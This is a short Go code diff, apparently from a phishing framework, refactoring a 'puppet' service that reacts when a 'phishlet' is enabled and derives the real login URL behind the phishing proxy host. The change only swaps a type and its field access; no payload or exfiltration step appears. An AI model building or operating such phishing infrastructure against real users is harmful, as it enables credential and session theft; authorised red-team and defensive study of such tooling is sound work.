@@ -118,13 +118,13 @@ func (s *PuppetService) CollectAndCache(ctx context.Context, phishletName, targe
 }
 
 func (s *PuppetService) handlePhishletEnabled(event Event) {
-	phishlet, ok := event.Payload.(*Phishlet)
+	cp, ok := event.Payload.(*ConfiguredPhishlet)
 	if !ok {
 		return
 	}
-	targetURL := deriveTargetURL(phishlet)
+	targetURL := deriveTargetURL(cp.Definition)
 	if targetURL == "" {
-		s.logger.Warn("puppet: cannot derive target URL", "phishlet", phishlet.Name)
+		s.logger.Warn("puppet: cannot derive target URL", "phishlet", cp.Definition.Name)
 		return
 	}
 
@@ -144,7 +144,7 @@ func (s *PuppetService) handlePhishletEnabled(event Event) {
 		if err := s.CollectAndCache(ctx, name, url); err != nil {
 			s.logger.Error("puppet collection failed", "phishlet", name, "error", err)
 		}
-	}(phishlet.Name, targetURL)
+	}(cp.Definition.Name, targetURL)
 }
 
 // deriveTargetURL builds the real login URL from the phishlet's landing proxy host.
